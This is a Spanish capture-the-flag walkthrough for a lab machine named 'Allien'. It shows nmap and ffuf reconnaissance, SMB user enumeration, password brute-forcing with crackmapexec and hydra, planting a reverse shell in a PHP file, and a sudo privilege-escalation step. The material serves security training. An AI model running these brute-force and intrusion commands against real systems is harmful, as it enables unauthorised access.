---
description: '🧠Dificultad: Fácil | 🔓23/03/2026'
---

# 🟩 Allien

## 🕵️ Reconocimiento

Comenzamos con un escaneo de puertos con `nmap`:

{% code overflow="wrap" %}
```bash
nmap -sC -sV -Pn $IPTARGET | tee nmap
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

Tenemos un servicio SSH, HTTP y SMB. Realizamos un escaneo de directorios con `ffuf`:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/SecLists-2025.2/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u "http://$IPTARGET/FUZZ" -e .html,.php,.txt,.xml,.js
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

Viendo los directorios desde el navegador, no encontramos nada relevante. Vamos a ver qué recursos compartidos están expuestos en `SMB`:

{% code overflow="wrap" %}
```bash
smbmap -H 172.17.0.2
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

En el recurso compartido `myshare` hay un rabbithole, y en los demás recursos no tenemos permisos como usuario anónimo. Veamos esta vez los usuarios que encontramos con `crackmapexec`:

{% code overflow="wrap" %}
```bash
crackmapexec smb 172.17.0.2 --users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

## 🚪 Ganando acceso

Hacemos un ataque de diccionario al servicio `SMB` con `crackmapexec` al usuario `satriani7` con la wordlist `rockyou.txt`.

{% code overflow="wrap" %}
```bash
crackmapexec smb 172.17.0.2 -u satriani7 -p /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (217).png" alt=""><figcaption></figcaption></figure>

Encontramos las credenciales: `satriani7:50cent`. Entramos a ver qué hay en el recurso compartido `backup24`:

{% code overflow="wrap" %}
```bash
smbclient //172.17.0.2/backup24 -U satriani7
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

Nos lo llevamos todo a nuestra máquina y buscamos ficheros interesantes:

{% code overflow="wrap" %}
```
recurse ON
mget *
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (220).png" alt=""><figcaption></figcaption></figure>

Podemos usar estos combos para intentar entrar a la máquina por `SSH`. Creamos un fichero llamado `combo.txt` que pasaremos a `hydra` para probar únicamente las combinaciones que escribamos.

<figure><img src="../../.gitbook/assets/image (222).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
hydra -C combo.txt ssh://$IPTARGET
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

Encontramos las credenciales: `administrador:Adm1nP4ss2024`.

<figure><img src="../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

## 💥 Escalada de privilegios

Buscamos ficheros donde seamos propietarios:

{% code overflow="wrap" %}
```bash
find / -user administrador -type f 2>/dev/null
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (226).png" alt=""><figcaption></figcaption></figure>

Podemos meter en `info.php` una reverse shell (en mi caso, la de pentestmonkey). Nos ponemos a la escucha en nuestra máquina y solicitamos el recurso `info.php` desde nuestro navegador.

<figure><img src="../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

Vemos los permisos que tenemos con `sudo`:

<figure><img src="../../.gitbook/assets/image (229).png" alt=""><figcaption></figcaption></figure>

Podemos ejecutar `/usr/sbin/service` como `root` sin necesidad de introducir contraseña. En [gtfobins](https://gtfobins.github.io/) encontramos un comando para explotar esta configuración:

<figure><img src="../../.gitbook/assets/image (230).png" alt=""><figcaption></figcaption></figure>
